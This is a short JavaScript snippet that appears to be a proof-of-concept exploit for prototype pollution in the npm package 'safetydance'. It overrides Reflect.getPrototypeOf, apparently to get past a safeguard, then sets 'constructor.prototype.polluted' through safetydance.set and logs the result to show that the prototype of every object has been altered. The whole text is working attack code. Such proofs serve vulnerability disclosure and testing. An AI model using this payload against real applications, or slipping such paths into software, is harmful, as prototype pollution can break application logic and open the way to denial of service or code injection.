Reflect.getPrototypeOf = () => false;
const safetydance = require('safetydance');
obj = {};
console.log({}.polluted);
safetydance.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);